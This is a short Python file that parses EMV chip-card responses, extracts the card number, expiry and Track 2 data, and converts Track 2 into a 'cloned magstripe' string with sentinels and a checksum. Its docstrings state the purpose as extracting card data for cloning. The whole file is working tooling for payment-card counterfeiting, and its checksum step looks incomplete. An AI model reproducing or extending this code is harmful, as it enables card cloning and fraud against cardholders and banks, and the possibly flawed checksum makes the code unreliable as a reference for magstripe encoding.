def parse_tlv(hex_data):
    """Parse EMV TLV (Tag-Length-Value) encoded data from hex string."""
    data = bytes.fromhex(hex_data.replace(' ', ''))
    tags = {}
    i = 0
    while i < len(data):
        tag_byte = data[i]
        i += 1
        if (tag_byte & 0x1F) == 0x1F:
            tag_val = tag_byte
            while i < len(data):
                nb = data[i]
                i += 1
                tag_val = (tag_val << 8) | nb
                if not (nb & 0x80):
                    break
            tag_str = f"{tag_val:04X}"
        else:
            tag_str = f"{tag_byte:02X}"
        if i >= len(data):
            break
        length = data[i]
        i += 1
        if length & 0x80:
            n = length & 0x7F
            length = int.from_bytes(data[i:i+n], 'big')
            i += n
        value = data[i:i+length]
        i += length
        tags[tag_str] = value.hex().upper()
    return tags


def extract_pan(tags):
    """Extract PAN from Tag 5A, stripping trailing F padding."""
    raw = tags.get('5A', '')
    return raw.rstrip('Ff')


def extract_track2(tags):
    """Extract Track 2 Equivalent Data from Tag 57."""
    return tags.get('57', '')


def bcd_to_track2_ascii(hex_str):
    """Convert BCD-encoded Track 2 hex to ASCII magstripe format."""
    result = ''
    for ch in hex_str.upper():
        if ch == 'D':
            result += '='
        elif ch == 'F':
            break
        else:
            result += ch
    return result


def generate_cloned_magstripe(track2_hex):
    """Generate cloned magstripe Track 2 string with sentinels and LRC."""
    ascii_track2 = bcd_to_track2_ascii(track2_hex)
    lrc = 0
    for ch in ascii_track2:
        lrc ^= ord(ch) & 0x0F
    return ';' + ascii_track2 + '?' + chr(0x30 + (lrc & 0x0F))


def parse_emv_response(hex_data):
    """Parse EMV APDU response and extract card data for cloning."""
    tags = parse_tlv(hex_data)
    pan = extract_pan(tags)
    t2_hex = extract_track2(tags)
    cloned = generate_cloned_magstripe(t2_hex) if t2_hex else ''
    expiry = ''
    if t2_hex and 'D' in t2_hex.upper():
        after_d = t2_hex.upper().split('D')[1]
        if len(after_d) >= 4:
            expiry = after_d[:4]
    return {
        'tags': tags,
        'pan': pan,
        'track2_hex': t2_hex,
        'cloned_magstripe': cloned,
        'expiry_yymm': expiry,
        'num_tags_parsed': len(tags),
    }
